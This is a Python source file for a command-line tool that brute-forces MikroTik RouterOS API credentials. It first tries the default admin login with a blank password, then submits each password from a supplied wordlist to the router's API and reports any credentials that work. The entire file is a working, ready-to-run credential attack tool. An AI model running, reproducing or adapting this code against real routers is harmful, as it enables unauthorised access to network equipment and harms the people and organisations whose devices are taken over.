#!/usr/bin/env python
# -*- coding: utf-8 -*-

#Check for Python3
import sys
if sys.version_info < (3, 0):
    sys.stdout.write("Sorry, Python 3.x is required to run this tool\n")
    sys.exit(2)

import binascii, getopt, hashlib, select, socket, time, signal, codecs, ssl
from _log import Log

# Constants - Define defaults
USE_SSL = False
TARGET = None
PORT = None
SSL_PORT = 8729
USER = None
PASSWORD = None
VERBOSE = False  # Whether to print API conversation width the router. Useful for debugging
VERBOSE_LOGIC = 'OR'  # Whether to print and save verbose log to file. AND - print and save, OR - do only one.
VERBOSE_FILE_MODE = 'w'  # Weather to create new file ('w') for log or append to old one ('a').

CONTEXT = ssl.create_default_context()  # It is possible to predefine context for SSL socket
CONTEXT.check_hostname = False
CONTEXT.verify_mode = ssl.CERT_NONE

class LoginError(Exception):
    pass

class WordTooLong(Exception):
    pass

class CreateSocketError(Exception):
    pass

class RouterOSTrapError(Exception):
    pass


banner=('''
        __  __ _ _              _   _ _        _    ____ ___      ____  _____
        |  \/  (_) | ___ __ ___ | |_(_) | __   / \  |  _ \_ _|    | __ )|  ___|
        | |\/| | | |/ / '__/ _ \| __| | |/ /  / _ \ | |_) | |_____|  _ \| |_
        | |  | | |   <| | | (_) | |_| |   <  / ___ \|  __/| |_____| |_) |  _|
        |_|  |_|_|_|\_\_|  \___/ \__|_|_|\_\/_/   \_\_|  |___|    |____/|_|


                    Mikrotik RouterOS API Bruteforce Tool 1.0.1
                            André Henrique (@mrhenrike)
          Please report tips, suggests and problems to Twitter (@mrhenrike)
                    https://github.com/mrhenrike/MikrotikAPI-BF
       ''')

def usage():
    print('''
    NAME
    \t mikrotikapi-bf.py - Brute force attack tool on Mikrotik box credentials exploiting API requests\n
    USAGE
    \t python mikrotikapi-bf.py [-t] [-p] [-u] [-d] [-s] [-q]\n
    OPTIONS
    \t -t, --target \t\t RouterOS target
    \t -p, --port \t\t RouterOS port (default 8728)
    \t -u, --user \t\t User name (default admin)
    \t -h, --help \t\t This help
    \t -d, --dictionary \t Password dictionary
    \t -s, --seconds \t\t Delay seconds between retry attempts (default 1)
    \t -q, --quiet \t\t Quiet mode

    EXAMPLE
    \t python3 mikrotikapi-bf.py -t 192.168.0.200 -u manager -p 1337 -d /tmp/passwords.txt -s 5
    \t python3 mikrotikapi-bf.py -t 192.168.0.1 -d /tmp/passwords.txt
    ''')


def error(err):
    print(err)
    print("Try 'mikrotikapi-bf.py -h' or 'mikrotikapi-bf.py --help' for more information.")


def signal_handler(signal, frame):
    print(" Aborted by user. Exiting... ")
    sys.exit(2)


class ApiRos:
    '''Modified class from official RouterOS API'''
    def __init__(self, sk, target, user, password, use_ssl=USE_SSL, port=8728,
                 verbose=VERBOSE, context=CONTEXT):

        self.target = target
        self.user = user
        self.password = password
        self.use_ssl = use_ssl
        self.port = port
        self.verbose = verbose
        self.context = context
        self.status = None
        
        self.sk = sk
        self.currenttag = 0

        # Port setting logic
        if port:
            self.port = port
        elif use_ssl:
            self.port = SSL_PORT
        else:
            self.port = PORT

         # Create Log instance to save or print verbose logs
        sys.log = Log(verbose, VERBOSE_LOGIC, VERBOSE_FILE_MODE)
        sys.log('')
        sys.log('#--------Mikrotik API Brute-force Attack#--------')
        sys.log('#-----------------------------------------------#')
        sys.log('API IP - {}, USER - {}'.format(target, user))
        self.sock = None
        self.connection = None
        self.create_connection()
        sys.log('Instance of Api created')

    # Open socket connection with router and wrap with SSL if needed.
    def open_socket(self):
        for res in socket.getaddrinfo(self.target, self.port, socket.AF_UNSPEC, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res

        self.sock = socket.socket(af, socket.SOCK_STREAM)
        self.sock.settimeout(5)  # Set socket timeout to 5 seconds, default is None

        try:
            # Trying to connect to RouterOS, error can occur if IP target is not reachable, or API is blocked in
            # RouterOS firewall or ip services, or port is wrong.
            self.connection = self.sock.connect(sa)
        
        except (socket.timeout):
            print("[-] SOCKET TIMEOUT! Target timed out! Exiting...")
            self.close()
            sys.exit(1)
        
        except OSError:
            print("[-] SOCKET ERROR! Check Target (IP or PORT parameters). Exiting...")
            raise CreateSocketError('Error: API failed to connect to socket. Host: {}, port: {}.'.format(self.target, self.port))

        # if self.use_ssl:
        #     try:
        #         self.sock = self.context.wrap_socket(self.sock)
        #     except:
        #        print("[-] SOCKET ERROR! The handshake operation timed out. Exiting...") 
        #        pass

        sys.log('API socket connection opened.')

    def login(self, username, pwd):
        sentence = ['/login', '=name=' + username, '=password=' + pwd]
        reply = self.communicate(sentence)
        if len(reply[0]) == 1 and reply[0][0] == '!done':
            # If login process was successful
            sys.log('Logged in successfully!')
            return reply
        elif 'Error' in reply:
            # Else if there was some kind of error during login process
            sys.log('Error in login process - {}'.format(reply))
            raise LoginError('Login ' + reply)
        elif len(reply[0]) == 2 and reply[0][1][0:5] == '=ret=':
            # Else if RouterOS uses old API login method, code continues with old method
            sys.log('Using old login process.')
            md5 = hashlib.md5(('\x00' + pwd).encode('utf-8'))
            md5.update(binascii.unhexlify(reply[0][1][5:]))
            sentence = ['/login', '=name=' + username, '=response=00'
                        + binascii.hexlify(md5.digest()).decode('utf-8')]
            sys.log('Logged in successfully!')
            return self.communicate(sentence)
    
    # Sending data to router and expecting something back
    def communicate(self, sentence_to_send):

        # There is specific way of sending word length in RouterOS API.
        # See RouterOS API Wiki for more info.
        def send_length(sentence_to_send):
            length_to_send = len(sentence_to_send)
            if length_to_send < 0x80:
                num_of_bytes = 1  # For words smaller than 128
            elif length_to_send < 0x4000:
                length_to_send += 0x8000
                num_of_bytes = 2  # For words smaller than 16384
            elif length_to_send < 0x200000:
                length_to_send += 0xC00000
                num_of_bytes = 3  # For words smaller than 2097152
            elif length_to_send < 0x10000000:
                length_to_send += 0xE0000000
                num_of_bytes = 4  # For words smaller than 268435456
            elif length_to_send < 0x100000000:
                num_of_bytes = 4  # For words smaller than 4294967296
                self.sock.sendall(b'\xF0')
            else:
                raise WordTooLong('Word is too long. Max length of word is 4294967295.')
            self.sock.sendall(length_to_send.to_bytes(num_of_bytes, byteorder='big'))

            # Actually I haven't successfully sent words larger than approx. 65520.
            # Probably it is some RouterOS limitation of 2^16.

        # The same logic applies for receiving word length from RouterOS side.
        # See RouterOS API Wiki for more info.
        def receive_length():
            r = self.sock.recv(1)  # Receive the first byte of word length

            # If the first byte of word is smaller than 80 (base 16),
            # then we already received the whole length and can return it.
            # Otherwise if it is larger, then word size is encoded in multiple bytes and we must receive them all to
            # get the whole word size.

            if r < b'\x80':
                r = int.from_bytes(r, byteorder='big')
            elif r < b'\xc0':
                r += self.sock.recv(1)
                r = int.from_bytes(r, byteorder='big')
                r -= 0x8000
            elif r < b'\xe0':
                r += self.sock.recv(2)
                r = int.from_bytes(r, byteorder='big')
                r -= 0xC00000
            elif r < b'\xf0':
                r += self.sock.recv(3)
                r = int.from_bytes(r, byteorder='big')
                r -= 0xE0000000
            elif r == b'\xf0':
                r = self.sock.recv(4)
                r = int.from_bytes(r, byteorder='big')
            return r

        def read_sentence():
            rcv_sentence = []  # Words will be appended here
            rcv_length = receive_length()  # Get the size of the word

            while rcv_length != 0:
                received = b''
                while rcv_length > len(received):
                    rec = self.sock.recv(rcv_length - len(received))
                    if rec == b'':
                        raise RuntimeError('socket connection broken')
                    received += rec
                received = received.decode('utf-8', 'backslashreplace')
                sys.log('<<< {}'.format(received))
                rcv_sentence.append(received)
                rcv_length = receive_length()  # Get the size of the next word
            return rcv_sentence

        # Sending part of conversation

        # Each word must be sent separately.
        # First, length of the word must be sent,
        # Then, the word itself.
        for word in sentence_to_send:
            send_length(word)
            self.sock.sendall(word.encode('utf-8'))  # Sending the word
            sys.log('>>> {}'.format(word))
        self.sock.sendall(b'\x00')  # Send zero length word to mark end of the sentence

        # Receiving part of the conversation

        # Will continue receiving until receives '!done' or some kind of error (!trap).
        # Everything will be appended to paragraph variable, and then returned.
        paragraph = []
        received_sentence = ['']
        while received_sentence and received_sentence[0] != '!done':
            received_sentence = read_sentence()
            paragraph.append(received_sentence)
        self.status = paragraph
        self.close()
        return paragraph
        

    # Initiate a conversation with the router
    def talk(self, message):

        # It is possible for message to be string, tuple or list containing multiple strings or tuples
        if type(message) == str or type(message) == tuple:
            return self.send(message)
        elif type(message) == list:
            reply = []
            for sentence in message:
                reply.append(self.send(sentence))
            return reply
        else:
            raise TypeError('talk() argument must be str or tuple containing str or list containing str or tuples')

    def send(self, sentence):
        # If sentence is string, not tuples of strings, it must be divided in words
        if type(sentence) == str:
            sentence = sentence.split()
        reply = self.communicate(sentence)

        # If RouterOS returns error from command that was sent
        if '!trap' in reply[0][0]:
            # You can comment following line out if you don't want to raise an error in case of !trap
            raise RouterOSTrapError("\nCommand: {}\nReturned an error: {}".format(sentence, reply))
            pass

        # reply is list containing strings with RAW output form API
        # nice_reply is a list containing output form API sorted in dictionary for easier use later
        nice_reply = []
        for m in range(len(reply) - 1):
            nice_reply.append({})
            for k, v in (x[1:].split('=', 1) for x in reply[m][1:]):
                nice_reply[m][k] = v
        return nice_reply

    def is_alive(self) -> bool:
        """Check if socket is alive and router responds"""

        # Check if socket is open in this end
        try:
            self.sock.settimeout(2)
        except OSError:
            sys.log("Socket is closed.")
            return False

        # Check if we can send and receive through socket
        try:
            self.talk('/system/identity/print')

        except (socket.timeout, IndexError, BrokenPipeError):
            sys.log("Router does not respond, closing socket.")
            self.close()
            return False

        sys.log("Socket is open, router responds.")
        self.sock.settimeout(None)
        return True

    def create_connection(self):
        """Create API connection

        1. Open socket
        2. Log into router
        """
        self.open_socket()
        self.login(self.user, self.password)

    def close(self):
        sys.log("API socket connection closed.")
        self.sock.close()

def run(pwd_num):
    run_time = "%.1f" % (time.time() - t)
    status = "Elapsed Time: %s sec | Passwords Tried: %s" % (run_time, pwd_num)
    bar = "_"*len(status)
    print(bar)
    print(status + "\n")

def main():
    print(banner)
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:p:u:d:s:q", ["help", "target=", "port=", "user=", "dictionary=", "seconds=", "quiet"])
    except getopt.GetoptError as err:
        error(err)
        sys.exit(2)

    if not opts:
        error("ERROR: You must specify at least a Target and a Dictionary")
        sys.exit(2)

    target = None
    port = None
    user = None
    dictionary = None
    quietmode = False
    seconds = None

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit(0)
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-p", "--port"):
            port = arg
        elif opt in ("-u", "--user"):
            user = arg
        elif opt in ("-d", "--dictionary"):
            dictionary = arg
        elif opt in ("-s", "--seconds"):
            seconds = arg
        elif opt in ("-q", "--quiet"):
            quietmode = True
        else:
            assert False, "error"
            sys.exit(2)

    if not target:
        error("ERROR: You must specify a Target")
        sys.exit(2)
    if not dictionary:
        error("ERROR: You must specify a Dictionary")
        sys.exit(2)
    if not port:
        port = 8728
    if not user:
        user = 'admin'
    if not seconds:
        seconds = 1

    print("[*] Starting bruteforce attack...")
    print("-" * 33)

    # Catch KeyboardInterrupt
    signal.signal(signal.SIGINT, signal_handler)
    
    # Looking for default RouterOS creds
    defcredcheck = True

    # Get the number of lines in file
    count = 0
    dictFile = codecs.open(dictionary,'rb', encoding='utf-8', errors='ignore')
    while 1:
        buffer = dictFile.read(8192*1024)
        if not buffer: break
        count += buffer.count('\n')
    dictFile.seek(0)
    
    # Passwords iteration & socket creation
    items = 1
    for password in dictFile.readlines():
        password = password.strip('\r\n')

        # First of all, we'll try with RouterOS default credentials ("admin":"")
        while defcredcheck:
            s = None
            apiros = ApiRos(s, target, "admin", "", port)
            dictFile.close()
            defaultcreds = apiros.status
            login = ''.join(defaultcreds[0][0])

            print("[-] Trying with default credentials on RouterOS...")
            if login == "!done":
                print ("[+] Login successful!!! Default RouterOS credentials were not changed. Log in with admin:<BLANK>")
                sys.exit(0)
            else:
                print("[-] Default RouterOS credentials were unsuccessful, trying with " + str(count) + " passwords in list...")
                print("")
                defcredcheck = False
                time.sleep(1)

        apiros = ApiRos(s, target, user, password, port)
        loginoutput = apiros.status
        login = ''.join(loginoutput[0][0])

        if not quietmode:
            print("[-] Trying " + str(items) + " of " + str(count) + " Passwords - Current: " + password)
            apiros.close()

        if login == "!done":
            print("[+] Login successful!!! User: " + user + " Password: " + password)
            run(items)
            return
        items +=1
        time.sleep(int(seconds))
    
    print()
    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
    run(count)

if __name__ == '__main__':
    t = time.time()
    main()
    sys.exit()


